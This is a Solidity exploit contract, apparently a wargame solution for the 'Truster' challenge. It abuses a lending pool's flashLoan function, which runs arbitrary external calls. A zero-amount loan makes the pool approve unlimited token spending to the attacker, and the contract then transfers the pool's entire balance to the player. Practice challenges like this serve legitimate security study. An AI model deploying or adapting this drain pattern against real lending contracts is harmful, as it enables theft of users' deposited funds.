// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool{
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        returns (bool);

}

contract TrusterAttacker{

    IPool public pool; 
    IERC20 public token;
    address public player;

    constructor(address payable _address, address _tokenAddress){
        pool = IPool(_address);
        token = IERC20(_tokenAddress);
        player = msg.sender;
    }

function attack() external{
    // Aprove unlimited spending of the coin for the attacker through the lendingPool
    // creat the data that we want to send with our transaction
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2**256-1);
    pool.flashLoan(0, address(this), address(token), data);
    uint amount = token.balanceOf(address(pool));
    token.transferFrom(address(pool), player, amount);
    

}

// mit dem Contract den Lendingpool aufrufen und ihm eine Function mitgeben welche 



}